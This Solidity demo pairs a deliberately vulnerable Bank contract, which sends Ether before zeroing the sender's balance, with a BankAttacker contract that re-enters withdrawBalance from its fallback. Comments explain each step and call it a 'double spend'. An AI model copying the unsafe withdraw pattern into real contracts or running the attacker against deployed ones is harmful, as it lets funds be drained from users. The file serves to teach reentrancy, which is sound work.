contract Bank{
/*This is the vulnerable contract. This contract contains the basic actions
necessary to interact with its users such as: get balance, add to balance,
and withdraw balance */

   mapping(address=>uint) userBalances;/*In solidity the mapping is a variable
   type that saves the relation between the user and the amount contributed to
   this contract. An address (account) is a unique indentifier in the blockchain*/

   function getUserBalance(address user) constant returns(uint) {
     return userBalances[user];
   }/*This function returns the amount (balance) that the user has contributed
   to this contract (this information is saved in the userBalances variable)*/

   function addToBalance() {
     userBalances[msg.sender] = userBalances[msg.sender] + msg.value;
   }/*This function assigns the value sent by the user to the userBalances varia
   ble.The msg variable is a global variable*/

   function withdrawBalance() {
     uint amountToWithdraw = userBalances[msg.sender];
     if (msg.sender.call.value(amountToWithdraw)() == false) {
         throw;
     }
     userBalances[msg.sender] = 0;
   }
}/* This function gets the user's balance and sets it to the amountToWithdraw
variable. Afterwards, the function sends, from the contract, to the user the
amount set in the amountToWithdraw variable. If the transaction is successful the
userBalances is set to 0 because all the funds deposited in the balance
are sent to the user. Otherwise, the throw command is triggered reversing the
previous transaction.*/


contract BankAttacker{
/*This is the malicious contract that implements a double spend attack to the
first contract: the bank contract. This attack (the double spend) can be carried
out n times. For this example, we carried out only 2 times.*/

   bool is_attack; /*This variable is used to put a limit to the attack
   recursions*/
   address bankAddress; /*This variable saves the address of the contract that I
   want to attack (the contract bank)*/

   function  BankAttacker(address _bankAddress, bool _is_attack){
       bankAddress=_bankAddress;
       is_attack=_is_attack;
   }/*This function sets the address of the contrcto to attack (the contract
   bank) and enables/disables the double spend attack */

   function() {

       if(is_attack==true)
       {
           is_attack=false;
           if(bankAddress.call(bytes4(sha3("withdrawBalance()")))) {
               throw;
           }
       }
   }/* This is the fallback function that calls the withdrawnBalance function
   when attack flag (previuosly set in the constructor) is enabled. This function
   is triggered because in the withdrawBalance function of the contract bank a
   send was executed. To avoid infinitive recursive fallbacks, it is necessary to
   set the variable is_attack to false. Otherwise, the gas would
   run out and the throw woulb be executed and the attack failed */

   function  deposit(){

        if(bankAddress.call.value(2).gas(20764)(bytes4(sha3("addToBalance()")))
        ==false) {
               throw;
           }

   }/*This function makes a deposit to the contract bank (2 wei) calling the
   addToBalance function of the contract bank*/

   function  withdrawn(){

        if(bankAddress.call(bytes4(sha3("withdrawBalance()")))==false ) {
               throw;
           }

   }/*Triggers the withdrawBalance function in the bank contract*/
}
